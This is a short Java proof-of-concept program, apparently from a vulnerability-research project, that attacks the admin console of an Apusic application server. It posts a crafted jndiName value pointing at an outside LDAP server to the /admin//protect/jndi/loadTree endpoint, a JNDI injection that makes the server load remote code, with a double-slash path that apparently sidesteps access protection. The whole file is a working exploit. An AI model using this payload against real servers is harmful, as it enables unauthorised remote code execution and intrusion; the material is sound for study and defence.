package apusic;


import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;

/**
 * 漏洞：
 *
 *
 * 关键调试类：
 * com.apusic.aasadmin.monitor.web.jndi.JndiController#loadTree
 */
public class loadTree_jndi {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201:6888/admin//protect/jndi/loadTree";
        String jndiUrl = "ldap://10.58.120.200:1389/hfzhal";
        /*
        执行出错可能需要开启代理
         */
        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type","application/x-www-form-urlencoded");
        String body = "jndiName=" + jndiUrl;
        Response response = httpRequest.sendStringPost(httpPost, body);
        System.out.println(response.getStatusCode());
    }
}
